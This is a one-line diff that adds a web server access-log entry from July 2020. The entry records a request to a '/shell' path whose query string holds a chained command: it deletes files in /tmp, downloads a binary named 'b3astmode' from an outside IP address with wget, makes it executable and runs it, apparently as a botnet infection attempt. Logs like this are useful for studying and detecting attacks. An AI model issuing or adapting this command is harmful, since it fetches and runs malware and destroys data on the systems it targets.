@@ -1,0 +1,1 @@
+36.112.59.206 - - [09/Jul/2020:07:18:54 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+95.213.165.45/beastmode/b3astmode;chmod+777+/tmp/b3astmode;sh+/tmp/b3astmode+BeastMode.Rep.Jaws HTTP/1.1" 301 162 "-" "-" "Hello, world"
